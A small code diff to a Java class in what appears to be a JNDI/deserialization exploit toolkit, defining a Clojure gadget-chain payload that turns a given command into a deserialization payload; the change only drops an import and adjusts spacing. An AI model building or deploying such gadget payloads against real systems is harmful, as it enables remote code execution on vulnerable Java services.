@@ -5,7 +5,6 @@ import clojure.core$constantly;
 import clojure.inspector.proxy$javax.swing.table.AbstractTableModel$ff19274a;
 import clojure.lang.PersistentArrayMap;
 import clojure.main$eval_opt;
-import com.qi4l.jndi.enumtypes.PayloadType;
 import com.qi4l.jndi.gadgets.annotation.Authors;
 import com.qi4l.jndi.gadgets.annotation.Dependencies;
 import com.qi4l.jndi.gadgets.utils.clojure.ClojureUtil;
@@ -31,7 +30,7 @@ import static com.qi4l.jndi.gadgets.annotation.Authors.JACKOFMOSTTRADES;
 
 @Dependencies({"org.clojure:clojure:1.8.0"})
 @Authors({JACKOFMOSTTRADES})
-public class Clojure implements ObjectPayload<Map<?, ?>>{
+public class Clojure implements ObjectPayload<Map<?, ?>> {
 
     public Map<?, ?> getObject(String command) throws Exception {
         String              clojurePayload = ClojureUtil.makeClojurePayload(command);
